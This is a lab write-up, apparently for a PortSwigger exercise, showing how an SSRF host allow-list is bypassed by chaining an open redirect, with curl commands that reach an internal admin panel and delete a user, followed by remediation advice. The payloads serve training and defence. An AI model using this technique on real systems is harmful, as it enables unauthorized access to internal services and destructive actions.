---
layout: post
title: "SSRF Filter Bypass via Open Redirection"
date: 2027-08-22 09:00:00 -0500
categories: [PortSwigger, SSRF]
tags: [ssrf, cwe-918, cwe-601, open-redirect, redirect-following, server-side-request-forgery]
---

## Overview

This lab uses the familiar "Check stock" SSRF primitive — the `stockApi` field holds a URL that the application fetches **server-side** — but the developer has hardened it with a **host allow-list**. The sink now only accepts URLs whose host belongs to a trusted set (the stock servers, or same-host relative paths). A direct external or internal URL is rejected outright.

The interesting part of this lab is that the fix is defeated not by mangling the URL (the trick in the blacklist lab), but by chaining in a **second, separate vulnerability** that already lives on the site: an **open redirect**. Two findings that are individually low-severity compose into full internal admin compromise.

The goal is to reach `http://192.168.0.12:8080/admin` and delete the user `carlos`.

---

## The sink and its filter

The product page's stock checker submits a whole URL:

```
POST /product/stock
Content-Type: application/x-www-form-urlencoded

stockApi=/product/stock/check?productId=1&storeId=1
```

Pointing it straight at the internal admin host is blocked by the allow-list:

```bash
curl -sk -X POST "$URL/product/stock" \
  --data-urlencode "stockApi=http://192.168.0.12:8080/admin"
# -> "Invalid external stock check url 'Invalid URL'"
```

The filter inspects the **literal value we submit**. A same-host *relative* path (like the default `/product/stock/check?...`) passes; an absolute external/internal URL does not. We need the server to make a request to a host the filter would never let us name directly.

---

## The second bug: an open redirect

Every product page carries a `Next product` link:

```
/product/nextProduct?currentProductId=1&path=/product?productId=2
```

The `path` parameter is copied, with no validation, straight into the `Location` header of a 302 response — a textbook open redirect (CWE-601):

```bash
curl -sk -D - "$URL/product/nextProduct?path=http://192.168.0.12:8080/admin" -o /dev/null
# HTTP/2 302
# location: http://192.168.0.12:8080/admin
```

We fully control where this endpoint redirects to, **and it lives on the same host** as the stock checker.

---

## Chaining them

The two facts combine perfectly:

1. The allow-list accepts a **same-host relative path**.
2. `/product/nextProduct?path=...` is a same-host relative path — *and* it returns a redirect to wherever we choose.
3. The server-side fetch client **follows redirects** transparently.

So we feed the open-redirect URL into `stockApi`. The filter sees a harmless same-host path and lets it through; the fetcher then follows the resulting 302 to the forbidden internal host.

First confirm it lands on the admin panel:

```bash
curl -sk -X POST "$URL/product/stock" \
  --data-urlencode "stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin"
# response body contains the admin "Users" panel and /admin/delete?username=carlos links
```

Then fire the privileged action to solve:

```bash
curl -sk -X POST "$URL/product/stock" \
  --data-urlencode "stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos"
```

The lab status flips to **Solved**.

---

## Why it worked

The allow-list validates the URL it is *handed*, but the HTTP client it uses to perform the fetch follows redirects automatically. That gap is the whole vulnerability: any same-host endpoint that lets an attacker control a redirect target becomes a tunnel straight through the allow-list. An open redirect — often dismissed as a low-impact phishing nuisance — here becomes the key that unlocks an internal admin interface.

---

## Fix

- **In the fetcher:** disable automatic redirect following, or re-validate the redirect target host against the allow-list on **every** hop, not just the initial URL.
- **In the redirect endpoint:** validate `path` against a relative-only allow-list; reject absolute URLs, scheme-bearing values, and protocol-relative `//host` forms.

The deeper lesson: validate the request that will *actually be sent*, including after every redirect — not just the string the user first submitted.
